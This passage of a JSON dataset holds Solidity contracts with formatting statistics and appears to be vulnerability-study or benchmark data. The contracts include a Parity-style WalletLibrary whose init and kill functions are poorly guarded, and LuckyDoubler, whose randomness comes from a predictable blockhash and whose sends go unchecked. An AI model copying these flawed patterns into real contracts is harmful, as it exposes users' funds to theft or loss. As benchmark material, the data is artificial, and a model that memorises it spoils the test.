      "code": "pragma solidity ^0.4.9;\ncontract WalletEvents {\nevent Confirmation(address owner, bytes32 operation);\nevent Revoke(address owner, bytes32 operation);\nevent OwnerChanged(address oldOwner, address newOwner);\nevent OwnerAdded(address newOwner);\nevent OwnerRemoved(address oldOwner);\nevent RequirementChanged(uint newRequirement);\nevent Deposit(address _from, uint value);\nevent SingleTransact(address owner, uint value, address to, bytes data, address created);\nevent MultiTransact(address owner, bytes32 operation, uint value, address to, bytes data, address created);\nevent ConfirmationNeeded(bytes32 operation, address initiator, uint value, address to, bytes data);\n}\ncontract WalletAbi {\nfunction revoke(bytes32 _operation) external;\nfunction changeOwner(address _from, address _to) external;\nfunction addOwner(address _owner) external;\nfunction removeOwner(address _owner) external;\nfunction changeRequirement(uint _newRequired) external;\nfunction isOwner(address _addr) constant returns (bool);\nfunction hasConfirmed(bytes32 _operation, address _owner) external constant returns (bool);\nfunction setDailyLimit(uint _newLimit) external;\nfunction execute(address _to, uint _value, bytes _data) external returns (bytes32 o_hash);\nfunction confirm(bytes32 _h) returns (bool o_success);\n}\ncontract WalletLibrary is WalletEvents {\nstruct PendingState {\nuint yetNeeded;\nuint ownersDone;\nuint index;\n}\nstruct Transaction {\naddress to;\nuint value;\nbytes data;\n}\nmodifier onlyowner {\nif (isOwner(msg.sender))\n_;\n}\nmodifier onlymanyowners(bytes32 _operation) {\nif (confirmAndCheck(_operation))\n_;\n}\nfunction() payable {\nif (msg.value > 0)\nDeposit(msg.sender, msg.value);\n}\nfunction initMultiowned(address[] _owners, uint _required) only_uninitialized {\nm_numOwners = _owners.length + 1;\nm_owners[1] = uint(msg.sender);\nm_ownerIndex[uint(msg.sender)] = 1;\nfor (uint i = 0; i < _owners.length; ++i) {\nm_owners[2 + i] = uint(_owners[i]);\nm_ownerIndex[uint(_owners[i])] = 2 + i;\n}\nm_required = _required;\n}\nfunction revoke(bytes32 _operation) external {\nuint ownerIndex = m_ownerIndex[uint(msg.sender)];\nif (ownerIndex == 0) return;\nuint ownerIndexBit = 2**ownerIndex;\nvar pending = m_pending[_operation];\nif (pending.ownersDone & ownerIndexBit > 0) {\npending.yetNeeded++;\npending.ownersDone -= ownerIndexBit;\nRevoke(msg.sender, _operation);\n}\n}\nfunction changeOwner(address _from, address _to) onlymanyowners(sha3(msg.data)) external {\nif (isOwner(_to)) return;\nuint ownerIndex = m_ownerIndex[uint(_from)];\nif (ownerIndex == 0) return;\nclearPending();\nm_owners[ownerIndex] = uint(_to);\nm_ownerIndex[uint(_from)] = 0;\nm_ownerIndex[uint(_to)] = ownerIndex;\nOwnerChanged(_from, _to);\n}\nfunction addOwner(address _owner) onlymanyowners(sha3(msg.data)) external {\nif (isOwner(_owner)) return;\nclearPending();\nif (m_numOwners >= c_maxOwners)\nreorganizeOwners();\nif (m_numOwners >= c_maxOwners)\nreturn;\nm_numOwners++;\nm_owners[m_numOwners] = uint(_owner);\nm_ownerIndex[uint(_owner)] = m_numOwners;\nOwnerAdded(_owner);\n}\nfunction removeOwner(address _owner) onlymanyowners(sha3(msg.data)) external {\nuint ownerIndex = m_ownerIndex[uint(_owner)];\nif (ownerIndex == 0) return;\nif (m_required > m_numOwners - 1) return;\nm_owners[ownerIndex] = 0;\nm_ownerIndex[uint(_owner)] = 0;\nclearPending();\nreorganizeOwners();\nOwnerRemoved(_owner);\n}\nfunction changeRequirement(uint _newRequired) onlymanyowners(sha3(msg.data)) external {\nif (_newRequired > m_numOwners) return;\nm_required = _newRequired;\nclearPending();\nRequirementChanged(_newRequired);\n}\nfunction getOwner(uint ownerIndex) external constant returns (address) {\nreturn address(m_owners[ownerIndex + 1]);\n}\nfunction isOwner(address _addr) constant returns (bool) {\nreturn m_ownerIndex[uint(_addr)] > 0;\n}\nfunction hasConfirmed(bytes32 _operation, address _owner) external constant returns (bool) {\nvar pending = m_pending[_operation];\nuint ownerIndex = m_ownerIndex[uint(_owner)];\nif (ownerIndex == 0) return false;\nuint ownerIndexBit = 2**ownerIndex;\nreturn !(pending.ownersDone & ownerIndexBit == 0);\n}\nfunction initDaylimit(uint _limit) only_uninitialized {\nm_dailyLimit = _limit;\nm_lastDay = today();\n}\nfunction setDailyLimit(uint _newLimit) onlymanyowners(sha3(msg.data)) external {\nm_dailyLimit = _newLimit;\n}\nfunction resetSpentToday() onlymanyowners(sha3(msg.data)) external {\nm_spentToday = 0;\n}\nmodifier only_uninitialized { if (m_numOwners > 0) throw; _; }\nfunction initWallet(address[] _owners, uint _required, uint _daylimit) only_uninitialized {\ninitDaylimit(_daylimit);\ninitMultiowned(_owners, _required);\n}\nfunction kill(address _to) onlymanyowners(sha3(msg.data)) external {\nsuicide(_to);\n}\nfunction execute(address _to, uint _value, bytes _data) external onlyowner returns (bytes32 o_hash) {\nif ((_data.length == 0 && underLimit(_value)) || m_required == 1) {\naddress created;\nif (_to == 0) {\ncreated = create(_value, _data);\n} else {\nif (!_to.call.value(_value)(_data))\nthrow;\n}\nSingleTransact(msg.sender, _value, _to, _data, created);\n} else {\no_hash = sha3(msg.data, block.number);\nif (m_txs[o_hash].to == 0 && m_txs[o_hash].value == 0 && m_txs[o_hash].data.length == 0) {\nm_txs[o_hash].to = _to;\nm_txs[o_hash].value = _value;\nm_txs[o_hash].data = _data;\n}\nif (!confirm(o_hash)) {\nConfirmationNeeded(o_hash, msg.sender, _value, _to, _data);\n}\n}\n}\nfunction create(uint _value, bytes _code) internal returns (address o_addr) {\n}\nfunction confirm(bytes32 _h) onlymanyowners(_h) returns (bool o_success) {\nif (m_txs[_h].to != 0 || m_txs[_h].value != 0 || m_txs[_h].data.length != 0) {\naddress created;\nif (m_txs[_h].to == 0) {\ncreated = create(m_txs[_h].value, m_txs[_h].data);\n} else {\nif (!m_txs[_h].to.call.value(m_txs[_h].value)(m_txs[_h].data))\nthrow;\n}\nMultiTransact(msg.sender, _h, m_txs[_h].value, m_txs[_h].to, m_txs[_h].data, created);\ndelete m_txs[_h];\nreturn true;\n}\n}\nfunction confirmAndCheck(bytes32 _operation) internal returns (bool) {\nuint ownerIndex = m_ownerIndex[uint(msg.sender)];\nif (ownerIndex == 0) return;\nvar pending = m_pending[_operation];\nif (pending.yetNeeded == 0) {\npending.yetNeeded = m_required;\npending.ownersDone = 0;\npending.index = m_pendingIndex.length++;\nm_pendingIndex[pending.index] = _operation;\n}\nuint ownerIndexBit = 2**ownerIndex;\nif (pending.ownersDone & ownerIndexBit == 0) {\nConfirmation(msg.sender, _operation);\nif (pending.yetNeeded <= 1) {\ndelete m_pendingIndex[m_pending[_operation].index];\ndelete m_pending[_operation];\nreturn true;\n}\nelse {\npending.yetNeeded--;\npending.ownersDone |= ownerIndexBit;\n}\n}\n}\nfunction reorganizeOwners() private {\nuint free = 1;\nwhile (free < m_numOwners) {\nwhile (free < m_numOwners && m_owners[free] != 0) free++;\nwhile (m_numOwners > 1 && m_owners[m_numOwners] == 0) m_numOwners--;\nif (free < m_numOwners && m_owners[m_numOwners] != 0 && m_owners[free] == 0) {\nm_owners[free] = m_owners[m_numOwners];\nm_ownerIndex[m_owners[free]] = free;\nm_owners[m_numOwners] = 0;\n}\n}\n}\nfunction underLimit(uint _value) internal onlyowner returns (bool) {\nif (today() > m_lastDay) {\nm_spentToday = 0;\nm_lastDay = today();\n}\nif (m_spentToday + _value >= m_spentToday && m_spentToday + _value <= m_dailyLimit) {\nm_spentToday += _value;\nreturn true;\n}\nreturn false;\n}\nfunction today() private constant returns (uint) { return now / 1 days; }\nfunction clearPending() internal {\nuint length = m_pendingIndex.length;\nfor (uint i = 0; i < length; ++i) {\ndelete m_txs[m_pendingIndex[i]];\nif (m_pendingIndex[i] != 0)\ndelete m_pending[m_pendingIndex[i]];\n}\ndelete m_pendingIndex;\n}\naddress constant _walletLibrary = 0xcafecafecafecafecafecafecafecafecafecafe;\nuint public m_required;\nuint public m_numOwners;\nuint public m_dailyLimit;\nuint public m_spentToday;\nuint public m_lastDay;\nuint[256] m_owners;\nuint constant c_maxOwners = 250;\nmapping(uint => uint) m_ownerIndex;\nmapping(bytes32 => PendingState) m_pending;\nbytes32[] m_pendingIndex;\nmapping (bytes32 => Transaction) m_txs;\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 87,
        "mode": "compressed",
        "original_lines": 392,
        "transformed_lines": 246,
        "original_chars": 13901,
        "transformed_chars": 7896,
        "compression_ratio": 0.57
      },
      "error": null
    },
    {
      "original_id": "sn_ds_210",
      "transformed_id": "ss_l1_compressed_sn_ds_210",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.0;\ncontract LuckyDoubler {\naddress private owner;\nuint private balance = 0;\nuint private fee = 5;\nuint private multiplier = 125;\nmapping (address => User) private users;\nEntry[] private entries;\nuint[] private unpaidEntries;\nfunction LuckyDoubler() {\nowner = msg.sender;\n}\nmodifier onlyowner { if (msg.sender == owner) _; }\nstruct User {\naddress id;\nuint deposits;\nuint payoutsReceived;\n}\nstruct Entry {\naddress entryAddress;\nuint deposit;\nuint payout;\nbool paid;\n}\nfunction() {\ninit();\n}\nfunction init() private{\nif (msg.value < 1 ether) {\nmsg.sender.send(msg.value);\nreturn;\n}\njoin();\n}\nfunction join() private {\nuint dValue = 1 ether;\nif (msg.value > 1 ether) {\nmsg.sender.send(msg.value - 1 ether);\ndValue = 1 ether;\n}\nif (users[msg.sender].id == address(0)) {\nusers[msg.sender].id = msg.sender;\nusers[msg.sender].deposits = 0;\nusers[msg.sender].payoutsReceived = 0;\n}\nentries.push(Entry(msg.sender, dValue, (dValue * (multiplier) / 100), false));\nusers[msg.sender].deposits++;\nunpaidEntries.push(entries.length -1);\nbalance += (dValue * (100 - fee)) / 100;\nuint index = unpaidEntries.length > 1 ? rand(unpaidEntries.length) : 0;\nEntry theEntry = entries[unpaidEntries[index]];\nif (balance > theEntry.payout) {\nuint payout = theEntry.payout;\ntheEntry.entryAddress.send(payout);\ntheEntry.paid = true;\nusers[theEntry.entryAddress].payoutsReceived++;\nbalance -= payout;\nif (index < unpaidEntries.length - 1)\nunpaidEntries[index] = unpaidEntries[unpaidEntries.length - 1];\nunpaidEntries.length--;\n}\nuint fees = this.balance - balance;\nif (fees > 0) {\nowner.send(fees);\n}\n}\nuint256 constant private FACTOR = 1157920892373161954235709850086879078532699846656405640394575840079131296399;\nfunction rand(uint max) constant private returns (uint256 result){\nuint256 factor = FACTOR * 100 / max;\nuint256 lastBlockNumber = block.number - 1;\nuint256 hashVal = uint256(block.blockhash(lastBlockNumber));\nreturn uint256((uint256(hashVal) / factor)) % max;\n}\nfunction changeOwner(address newOwner) onlyowner {\nowner = newOwner;\n}\nfunction changeMultiplier(uint multi) onlyowner {\nif (multi < 110 || multi > 150) throw;\nmultiplier = multi;\n}\nfunction changeFee(uint newFee) onlyowner {\nif (fee > 5)\nthrow;\nfee = newFee;\n}\nfunction multiplierFactor() constant returns (uint factor, string info) {\nfactor = multiplier;\ninfo = 'The current multiplier applied to all deposits. Min 110%, max 150%.';\n}\nfunction currentFee() constant returns (uint feePercentage, string info) {\nfeePercentage = fee;\ninfo = 'The fee percentage applied to all deposits. It can change to speed payouts (max 5%).';\n}\nfunction totalEntries() constant returns (uint count, string info) {\ncount = entries.length;\ninfo = 'The number of deposits.';\n}\nfunction userStats(address user) constant returns (uint deposits, uint payouts, string info) {\nif (users[user].id != address(0x0)) {\ndeposits = users[user].deposits;\npayouts = users[user].payoutsReceived;\ninfo = 'Users stats: total deposits, payouts received.';\n}\n}\nfunction entryDetails(uint index) constant returns (address user, uint payout, bool paid, string info) {\nif (index < entries.length) {\nuser = entries[index].entryAddress;\npayout = entries[index].payout / 1 finney;\npaid = entries[index].paid;\ninfo = 'Entry info: user address, expected payout in Finneys, payout status.';\n}\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 42,
        "mode": "compressed",
        "original_lines": 180,
        "transformed_lines": 113,
        "original_chars": 5187,
        "transformed_chars": 3319,
        "compression_ratio": 0.64
      },
      "error": null
    },
    {
      "original_id": "sn_ds_211",
      "transformed_id": "ss_l1_compressed_sn_ds_211",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.23;\ncontract Token {\nuint256 public totalSupply;\nfunction balanceOf(address _owner) public constant returns (uint256 balance);\nfunction transfer(address _to, uint256 _value) public returns (bool success);\nfunction transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\nfunction approve(address _spender, uint256 _value) public returns (bool success);\nfunction allowance(address _owner, address _spender) public constant returns (uint256 remaining);\nevent Transfer(address indexed _from, address indexed _to, uint256 _value);\nevent Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\nlibrary ECTools {\nfunction recoverSigner(bytes32 _hashedMsg, string _sig) public pure returns (address) {\nrequire(_hashedMsg != 0x00);\nbytes memory prefix = \"\\x19Ethereum Signed Message:\\n32\";\nbytes32 prefixedHash = keccak256(abi.encodePacked(prefix, _hashedMsg));\nif (bytes(_sig).length != 132) {\nreturn 0x0;\n}\nbytes32 r;\nbytes32 s;\nuint8 v;\nbytes memory sig = hexstrToBytes(substring(_sig, 2, 132));\nassembly {\nr := mload(add(sig, 32))\ns := mload(add(sig, 64))\nv := byte(0, mload(add(sig, 96)))\n}\nif (v < 27) {\nv += 27;\n}\nif (v < 27 || v > 28) {\nreturn 0x0;\n}\nreturn ecrecover(prefixedHash, v, r, s);\n}\nfunction isSignedBy(bytes32 _hashedMsg, string _sig, address _addr) public pure returns (bool) {\nrequire(_addr != 0x0);\nreturn _addr == recoverSigner(_hashedMsg, _sig);\n}\nfunction hexstrToBytes(string _hexstr) public pure returns (bytes) {\nuint len = bytes(_hexstr).length;\nrequire(len % 2 == 0);\nbytes memory bstr = bytes(new string(len / 2));\nuint k = 0;\nstring memory s;\nstring memory r;\nfor (uint i = 0; i < len; i += 2) {\ns = substring(_hexstr, i, i + 1);\nr = substring(_hexstr, i + 1, i + 2);\nuint p = parseInt16Char(s) * 16 + parseInt16Char(r);\nbstr[k++] = uintToBytes32(p)[31];\n}\nreturn bstr;\n}\nfunction parseInt16Char(string _char) public pure returns (uint) {\nbytes memory bresult = bytes(_char);\nif ((bresult[0] >= 48) && (bresult[0] <= 57)) {\nreturn uint(bresult[0]) - 48;\n} else if ((bresult[0] >= 65) && (bresult[0] <= 70)) {\nreturn uint(bresult[0]) - 55;\n} else if ((bresult[0] >= 97) && (bresult[0] <= 102)) {\nreturn uint(bresult[0]) - 87;\n} else {\nrevert();\n}\n}\nfunction uintToBytes32(uint _uint) public pure returns (bytes b) {\nb = new bytes(32);\nassembly {mstore(add(b, 32), _uint)}\n}\nfunction toEthereumSignedMessage(string _msg) public pure returns (bytes32) {\nuint len = bytes(_msg).length;\nrequire(len > 0);\nbytes memory prefix = \"\\x19Ethereum Signed Message:\\n\";\nreturn keccak256(abi.encodePacked(prefix, uintToString(len), _msg));\n}\nfunction uintToString(uint _uint) public pure returns (string str) {\nuint len = 0;\nuint m = _uint + 0;\nwhile (m != 0) {\nlen++;\nm /= 10;\n}\nbytes memory b = new bytes(len);\nuint i = len - 1;\nwhile (_uint != 0) {\nuint remainder = _uint % 10;\n_uint = _uint / 10;\nb[i--] = byte(48 + remainder);\n}\nstr = string(b);\n}\nfunction substring(string _str, uint _startIndex, uint _endIndex) public pure returns (string) {\nbytes memory strBytes = bytes(_str);\nrequire(_startIndex <= _endIndex);\nrequire(_startIndex >= 0);\nrequire(_endIndex <= strBytes.length);\nbytes memory result = new bytes(_endIndex - _startIndex);\nfor (uint i = _startIndex; i < _endIndex; i++) {\nresult[i - _startIndex] = strBytes[i];\n}\nreturn string(result);\n}\n}\ncontract StandardToken is Token {\nfunction transfer(address _to, uint256 _value) public returns (bool success) {\nrequire(balances[msg.sender] >= _value);\nbalances[msg.sender] -= _value;\nbalances[_to] += _value;\nemit Transfer(msg.sender, _to, _value);\nreturn true;\n}\nfunction transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\nrequire(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\nbalances[_to] += _value;\nbalances[_from] -= _value;\nallowed[_from][msg.sender] -= _value;\nemit Transfer(_from, _to, _value);\nreturn true;\n}\nfunction balanceOf(address _owner) public constant returns (uint256 balance) {\nreturn balances[_owner];\n}\nfunction approve(address _spender, uint256 _value) public returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nemit Approval(msg.sender, _spender, _value);\nreturn true;\n}\nfunction allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\nreturn allowed[_owner][_spender];\n}\nmapping (address => uint256) balances;\nmapping (address => mapping (address => uint256)) allowed;\n}\ncontract HumanStandardToken is StandardToken {\nstring public name;\nuint8 public decimals;\nstring public symbol;\nstring public version = 'H0.1';\nconstructor(\nuint256 _initialAmount,\nstring _tokenName,\nuint8 _decimalUnits,\nstring _tokenSymbol\n) public {\nbalances[msg.sender] = _initialAmount;\ntotalSupply = _initialAmount;\nname = _tokenName;\ndecimals = _decimalUnits;\nsymbol = _tokenSymbol;\n}\nfunction approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nemit Approval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}\n}\ncontract LedgerChannel {\nstring public constant NAME = \"Ledger Channel\";\nstring public constant VERSION = \"0.0.1\";\nuint256 public numChannels = 0;\nevent DidLCOpen (\nbytes32 indexed channelId,\naddress indexed partyA,\naddress indexed partyI,\nuint256 ethBalanceA,\naddress token,\nuint256 tokenBalanceA,\nuint256 LCopenTimeout\n);\nevent DidLCJoin (\nbytes32 indexed channelId,\nuint256 ethBalanceI,\nuint256 tokenBalanceI\n);\nevent DidLCDeposit (\nbytes32 indexed channelId,\naddress indexed recipient,\nuint256 deposit,\nbool isToken\n);\nevent DidLCUpdateState (\nbytes32 indexed channelId,\nuint256 sequence,\nuint256 numOpenVc,\nuint256 ethBalanceA,\nuint256 tokenBalanceA,\nuint256 ethBalanceI,\nuint256 tokenBalanceI,\nbytes32 vcRoot,\nuint256 updateLCtimeout\n);\nevent DidLCClose (\nbytes32 indexed channelId,\nuint256 sequence,\nuint256 ethBalanceA,\nuint256 tokenBalanceA,\nuint256 ethBalanceI,\nuint256 tokenBalanceI\n);\nevent DidVCInit (\nbytes32 indexed lcId,\nbytes32 indexed vcId,\nbytes proof,\nuint256 sequence,\naddress partyA,\naddress partyB,\nuint256 balanceA,\nuint256 balanceB\n);\nevent DidVCSettle (\nbytes32 indexed lcId,\nbytes32 indexed vcId,\nuint256 updateSeq,\nuint256 updateBalA,\nuint256 updateBalB,\naddress challenger,\nuint256 updateVCtimeout\n);\nevent DidVCClose(\nbytes32 indexed lcId,\nbytes32 indexed vcId,\nuint256 balanceA,\nuint256 balanceB\n);\nstruct Channel {\naddress[2] partyAddresses;\nuint256[4] ethBalances;\nuint256[4] erc20Balances;\nuint256[2] initialDeposit;\nuint256 sequence;\nuint256 confirmTime;\nbytes32 VCrootHash;\nuint256 LCopenTimeout;\nuint256 updateLCtimeout;\nbool isOpen;\nbool isUpdateLCSettling;\nuint256 numOpenVC;\nHumanStandardToken token;\n}\nstruct VirtualChannel {\nbool isClose;\nbool isInSettlementState;\nuint256 sequence;\naddress challenger;\nuint256 updateVCtimeout;\naddress partyA;\naddress partyB;\naddress partyI;\nuint256[2] ethBalances;\nuint256[2] erc20Balances;\nuint256[2] bond;\nHumanStandardToken token;\n}\nmapping(bytes32 => VirtualChannel) public virtualChannels;\nmapping(bytes32 => Channel) public Channels;\nfunction createChannel(\nbytes32 _lcID,\naddress _partyI,\nuint256 _confirmTime,\naddress _token,\nuint256[2] _balances\n)\npublic\npayable {\nrequire(Channels[_lcID].partyAddresses[0] == address(0), \"Channel has already been created.\");\nrequire(_partyI != 0x0, \"No partyI address provided to LC creation\");\nrequire(_balances[0] >= 0 && _balances[1] >= 0, \"Balances cannot be negative\");\nChannels[_lcID].partyAddresses[0] = msg.sender;\nChannels[_lcID].partyAddresses[1] = _partyI;\nif(_balances[0] != 0) {\nrequire(msg.value == _balances[0], \"Eth balance does not match sent value\");\nChannels[_lcID].ethBalances[0] = msg.value;\n}\nif(_balances[1] != 0) {\nChannels[_lcID].token = HumanStandardToken(_token);\nrequire(Channels[_lcID].token.transferFrom(msg.sender, this, _balances[1]),\"CreateChannel: token transfer failure\");\nChannels[_lcID].erc20Balances[0] = _balances[1];\n}\nChannels[_lcID].sequence = 0;\nChannels[_lcID].confirmTime = _confirmTime;\nChannels[_lcID].LCopenTimeout = now + _confirmTime;\nChannels[_lcID].initialDeposit = _balances;\nemit DidLCOpen(_lcID, msg.sender, _partyI, _balances[0], _token, _balances[1], Channels[_lcID].LCopenTimeout);\n}\nfunction LCOpenTimeout(bytes32 _lcID) public {\nrequire(msg.sender == Channels[_lcID].partyAddresses[0] && Channels[_lcID].isOpen == false);\nrequire(now > Channels[_lcID].LCopenTimeout);\nif(Channels[_lcID].initialDeposit[0] != 0) {\nChannels[_lcID].partyAddresses[0].transfer(Channels[_lcID].ethBalances[0]);\n}\nif(Channels[_lcID].initialDeposit[1] != 0) {\nrequire(Channels[_lcID].token.transfer(Channels[_lcID].partyAddresses[0], Channels[_lcID].erc20Balances[0]),\"CreateChannel: token transfer failure\");\n}\nemit DidLCClose(_lcID, 0, Channels[_lcID].ethBalances[0], Channels[_lcID].erc20Balances[0], 0, 0);\ndelete Channels[_lcID];\n}\nfunction joinChannel(bytes32 _lcID, uint256[2] _balances) public payable {\nrequire(Channels[_lcID].isOpen == false);\nrequire(msg.sender == Channels[_lcID].partyAddresses[1]);\nif(_balances[0] != 0) {\nrequire(msg.value == _balances[0], \"state balance does not match sent value\");\nChannels[_lcID].ethBalances[1] = msg.value;\n}\nif(_balances[1] != 0) {\nrequire(Channels[_lcID].token.transferFrom(msg.sender, this, _balances[1]),\"joinChannel: token transfer failure\");\nChannels[_lcID].erc20Balances[1] = _balances[1];\n}\nChannels[_lcID].initialDeposit[0]+=_balances[0];\nChannels[_lcID].initialDeposit[1]+=_balances[1];\nChannels[_lcID].isOpen = true;\nnumChannels++;\nemit DidLCJoin(_lcID, _balances[0], _balances[1]);\n}\nfunction deposit(bytes32 _lcID, address recipient, uint256 _balance, bool isToken) public payable {\nrequire(Channels[_lcID].isOpen == true, \"Tried adding funds to a closed channel\");\nrequire(recipient == Channels[_lcID].partyAddresses[0] || recipient == Channels[_lcID].partyAddresses[1]);\nif (Channels[_lcID].partyAddresses[0] == recipient) {\nif(isToken) {\nrequire(Channels[_lcID].token.transferFrom(msg.sender, this, _balance),\"deposit: token transfer failure\");\nChannels[_lcID].erc20Balances[2] += _balance;\n} else {\nrequire(msg.value == _balance, \"state balance does not match sent value\");\nChannels[_lcID].ethBalances[2] += msg.value;\n}\n}\nif (Channels[_lcID].partyAddresses[1] == recipient) {\nif(isToken) {\nrequire(Channels[_lcID].token.transferFrom(msg.sender, this, _balance),\"deposit: token transfer failure\");\nChannels[_lcID].erc20Balances[3] += _balance;\n} else {\nrequire(msg.value == _balance, \"state balance does not match sent value\");\nChannels[_lcID].ethBalances[3] += msg.value;\n}\n}\nemit DidLCDeposit(_lcID, recipient, _balance, isToken);\n}\nfunction consensusCloseChannel(\nbytes32 _lcID,\nuint256 _sequence,\nuint256[4] _balances,\nstring _sigA,\nstring _sigI\n)\npublic {\nrequire(Channels[_lcID].isOpen == true);\nuint256 totalEthDeposit = Channels[_lcID].initialDeposit[0] + Channels[_lcID].ethBalances[2] + Channels[_lcID].ethBalances[3];\nuint256 totalTokenDeposit = Channels[_lcID].initialDeposit[1] + Channels[_lcID].erc20Balances[2] + Channels[_lcID].erc20Balances[3];\nrequire(totalEthDeposit == _balances[0] + _balances[1]);\nrequire(totalTokenDeposit == _balances[2] + _balances[3]);\nbytes32 _state = keccak256(\nabi.encodePacked(\n_lcID,\ntrue,\n_sequence,\nuint256(0),\nbytes32(0x0),\nChannels[_lcID].partyAddresses[0],\nChannels[_lcID].partyAddresses[1],\n_balances[0],\n_balances[1],\n_balances[2],\n_balances[3]\n)\n);\nrequire(Channels[_lcID].partyAddresses[0] == ECTools.recoverSigner(_state, _sigA));\nrequire(Channels[_lcID].partyAddresses[1] == ECTools.recoverSigner(_state, _sigI));\nChannels[_lcID].isOpen = false;\nif(_balances[0] != 0 || _balances[1] != 0) {\nChannels[_lcID].partyAddresses[0].transfer(_balances[0]);\nChannels[_lcID].partyAddresses[1].transfer(_balances[1]);\n}\nif(_balances[2] != 0 || _balances[3] != 0) {\nrequire(Channels[_lcID].token.transfer(Channels[_lcID].partyAddresses[0], _balances[2]),\"happyCloseChannel: token transfer failure\");\nrequire(Channels[_lcID].token.transfer(Channels[_lcID].partyAddresses[1], _balances[3]),\"happyCloseChannel: token transfer failure\");\n}\nnumChannels--;\nemit DidLCClose(_lcID, _sequence, _balances[0], _balances[1], _balances[2], _balances[3]);\n}\nfunction updateLCstate(\nbytes32 _lcID,\nuint256[6] updateParams,\nbytes32 _VCroot,\nstring _sigA,\nstring _sigI\n)\npublic {\nChannel storage channel = Channels[_lcID];\nrequire(channel.isOpen);\nrequire(channel.sequence < updateParams[0]);\nrequire(channel.ethBalances[0] + channel.ethBalances[1] >= updateParams[2] + updateParams[3]);\nrequire(channel.erc20Balances[0] + channel.erc20Balances[1] >= updateParams[4] + updateParams[5]);\nif(channel.isUpdateLCSettling == true) {\nrequire(channel.updateLCtimeout > now);\n}\nbytes32 _state = keccak256(\nabi.encodePacked(\n_lcID,\nfalse,\nupdateParams[0],\nupdateParams[1],\n_VCroot,\nchannel.partyAddresses[0],\nchannel.partyAddresses[1],\nupdateParams[2],\nupdateParams[3],\nupdateParams[4],\nupdateParams[5]\n)\n);\nrequire(channel.partyAddresses[0] == ECTools.recoverSigner(_state, _sigA));\nrequire(channel.partyAddresses[1] == ECTools.recoverSigner(_state, _sigI));\nchannel.sequence = updateParams[0];\nchannel.numOpenVC = updateParams[1];\nchannel.ethBalances[0] = updateParams[2];\nchannel.ethBalances[1] = updateParams[3];\nchannel.erc20Balances[0] = updateParams[4];\nchannel.erc20Balances[1] = updateParams[5];\nchannel.VCrootHash = _VCroot;\nchannel.isUpdateLCSettling = true;\nchannel.updateLCtimeout = now + channel.confirmTime;\nemit DidLCUpdateState (\n_lcID,\nupdateParams[0],\nupdateParams[1],\nupdateParams[2],\nupdateParams[3],\nupdateParams[4],\nupdateParams[5],\n_VCroot,\nchannel.updateLCtimeout\n);\n}\nfunction initVCstate(\nbytes32 _lcID,\nbytes32 _vcID,\nbytes _proof,\naddress _partyA,\naddress _partyB,\nuint256[2] _bond,\nuint256[4] _balances,\nstring sigA\n)\npublic {\nrequire(Channels[_lcID].isOpen, \"LC is closed.\");\nrequire(!virtualChannels[_vcID].isClose, \"VC is closed.\");\nrequire(Channels[_lcID].updateLCtimeout < now, \"LC timeout not over.\");\nrequire(virtualChannels[_vcID].updateVCtimeout == 0);\nbytes32 _initState = keccak256(\nabi.encodePacked(_vcID, uint256(0), _partyA, _partyB, _bond[0], _bond[1], _balances[0], _balances[1], _balances[2], _balances[3])\n);\nrequire(_partyA == ECTools.recoverSigner(_initState, sigA));\nrequire(_isContained(_initState, _proof, Channels[_lcID].VCrootHash) == true);\nvirtualChannels[_vcID].partyA = _partyA;\nvirtualChannels[_vcID].partyB = _partyB;\nvirtualChannels[_vcID].sequence = uint256(0);\nvirtualChannels[_vcID].ethBalances[0] = _balances[0];\nvirtualChannels[_vcID].ethBalances[1] = _balances[1];\nvirtualChannels[_vcID].erc20Balances[0] = _balances[2];\nvirtualChannels[_vcID].erc20Balances[1] = _balances[3];\nvirtualChannels[_vcID].bond = _bond;\nvirtualChannels[_vcID].updateVCtimeout = now + Channels[_lcID].confirmTime;\nvirtualChannels[_vcID].isInSettlementState = true;\nemit DidVCInit(_lcID, _vcID, _proof, uint256(0), _partyA, _partyB, _balances[0], _balances[1]);\n}\nfunction settleVC(\nbytes32 _lcID,\nbytes32 _vcID,\nuint256 updateSeq,\naddress _partyA,\naddress _partyB,\nuint256[4] updateBal,\nstring sigA\n)\npublic {\nrequire(Channels[_lcID].isOpen, \"LC is closed.\");\nrequire(!virtualChannels[_vcID].isClose, \"VC is closed.\");\nrequire(virtualChannels[_vcID].sequence < updateSeq, \"VC sequence is higher than update sequence.\");\nrequire(\nvirtualChannels[_vcID].ethBalances[1] < updateBal[1] && virtualChannels[_vcID].erc20Balances[1] < updateBal[3],\n\"State updates may only increase recipient balance.\"\n);\nrequire(\nvirtualChannels[_vcID].bond[0] == updateBal[0] + updateBal[1] &&\nvirtualChannels[_vcID].bond[1] == updateBal[2] + updateBal[3],\n\"Incorrect balances for bonded amount\");\nrequire(Channels[_lcID].updateLCtimeout < now);\nbytes32 _updateState = keccak256(\nabi.encodePacked(\n_vcID,\nupdateSeq,\n_partyA,\n_partyB,\nvirtualChannels[_vcID].bond[0],\nvirtualChannels[_vcID].bond[1],\nupdateBal[0],\nupdateBal[1],\nupdateBal[2],\nupdateBal[3]\n)\n);\nrequire(virtualChannels[_vcID].partyA == ECTools.recoverSigner(_updateState, sigA));\nvirtualChannels[_vcID].challenger = msg.sender;\nvirtualChannels[_vcID].sequence = updateSeq;\nvirtualChannels[_vcID].ethBalances[0] = updateBal[0];\nvirtualChannels[_vcID].ethBalances[1] = updateBal[1];\nvirtualChannels[_vcID].erc20Balances[0] = updateBal[2];\nvirtualChannels[_vcID].erc20Balances[1] = 